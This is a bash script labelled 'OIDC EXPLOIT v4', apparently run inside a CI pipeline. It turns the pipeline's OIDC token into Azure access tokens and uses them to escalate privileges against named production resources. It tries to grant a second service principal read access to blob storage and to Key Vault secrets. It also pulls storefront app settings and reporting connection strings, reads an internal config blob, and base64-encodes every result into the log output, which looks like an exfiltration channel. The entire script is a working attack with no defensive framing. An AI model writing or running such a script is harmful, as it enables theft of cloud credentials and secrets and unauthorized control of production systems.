#!/bin/bash
set -uo pipefail

echo "=== OIDC EXPLOIT v4 - CICD DEPLOYER PRIVESC ==="

T="${AZURE_TENANT_ID}"
SUB="${AZURE_SUBSCRIPTION_ID}"
CID="${AZURE_CLIENT_ID}"
LA_SP="43834909-47cf-4a4a-8048-e323b4897ed3"

# Get OIDC and ARM token as cicd-deployer
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
echo "oidc_len=${#OIDC}"

ARM=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  -d "grant_type=client_credentials" \
  -d "client_id=$CID" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" \
  -d "scope=https://management.azure.com/.default" | jq -r '.access_token // empty')
echo "arm_len=${#ARM}"

# 1) List ALL role assignments visible to us
echo "=== ALL ROLE ASSIGNMENTS ==="
ROLES=$(curl -sS -H "Authorization: Bearer $ARM" \
  "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01")
echo "ROLES_B64=$(echo "$ROLES" | base64 -w0)"

# 2) Get our own SP object ID from the token
echo "=== JWT CLAIMS ==="
echo "$ARM" | cut -d. -f2 | base64 -d 2>/dev/null | jq '{oid,appid,roles,wids,scp}' 2>/dev/null || true

# 3) Try creating a role assignment: Storage Blob Data Reader for legacy-admin
echo "=== TRY CREATE ROLE ASSIGNMENT ==="
# Storage Blob Data Reader role: 2a2b9908-6ea1-4ae2-8e65-a410df84e7d1
ASSIGN_ID=$(python3 -c "import uuid;print(uuid.uuid4())")
ASSIGN_BODY="{\"properties\":{\"roleDefinitionId\":\"/subscriptions/$SUB/providers/Microsoft.Authorization/roleDefinitions/2a2b9908-6ea1-4ae2-8e65-a410df84e7d1\",\"principalId\":\"$LA_SP\",\"principalType\":\"ServicePrincipal\"}}"
ASSIGN_RES=$(curl -sS -X PUT -H "Authorization: Bearer $ARM" -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/providers/Microsoft.Authorization/roleAssignments/$ASSIGN_ID?api-version=2022-04-01" \
  -d "$ASSIGN_BODY" 2>&1)
echo "ASSIGN_RES_B64=$(echo "$ASSIGN_RES" | base64 -w0)"

# 4) KV-SEC vault properties (ARM level)
echo "=== KV-SEC VAULT PROPERTIES ==="
KVPROP=$(curl -sS -H "Authorization: Bearer $ARM" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz?api-version=2023-07-01" 2>&1)
echo "KVPROP_B64=$(echo "$KVPROP" | base64 -w0)"

# 5) Try updating KV-SEC access policy
echo "=== TRY UPDATE KV-SEC ACCESS POLICY ==="
KVADD=$(curl -sS -X PUT -H "Authorization: Bearer $ARM" -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/accessPolicies/add?api-version=2023-07-01" \
  -d "{\"properties\":{\"accessPolicies\":[{\"tenantId\":\"$T\",\"objectId\":\"$LA_SP\",\"permissions\":{\"secrets\":[\"get\",\"list\"]}}]}}" 2>&1)
echo "KVADD_B64=$(echo "$KVADD" | base64 -w0)"

# 6) Try storefront config
echo "=== STOREFRONT CONFIG ==="
SFCONF=$(curl -sS -H "Authorization: Bearer $ARM" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/web?api-version=2022-03-01" 2>&1)
echo "SFCONF_B64=$(echo "$SFCONF" | base64 -w0)"

# 7) Storefront appsettings
echo "=== STOREFRONT APPSETTINGS ==="
SFSET=$(curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Length: 0" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2022-03-01" 2>&1)
echo "SFSET_B64=$(echo "$SFSET" | base64 -w0)"

# 8) Reporting app connection strings
echo "=== REPORTING CONN STRINGS ==="
REPCS=$(curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Length: 0" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/connectionstrings/list?api-version=2022-03-01" 2>&1)
echo "REPCS_B64=$(echo "$REPCS" | base64 -w0)"

# 9) Try direct blob read with cicd-deployer storage token
OIDC5=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
ST=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  -d "grant_type=client_credentials" \
  -d "client_id=$CID" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC5" \
  -d "scope=https://storage.azure.com/.default" | jq -r '.access_token // empty')
echo "cicd_st_len=${#ST}"
if [ -n "$ST" ]; then
  BLOB=$(curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" \
    "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json" 2>&1)
  echo "BLOB_B64=$(echo "$BLOB" | base64 -w0)"
fi

echo ""
echo "=== DONE v4 ==="
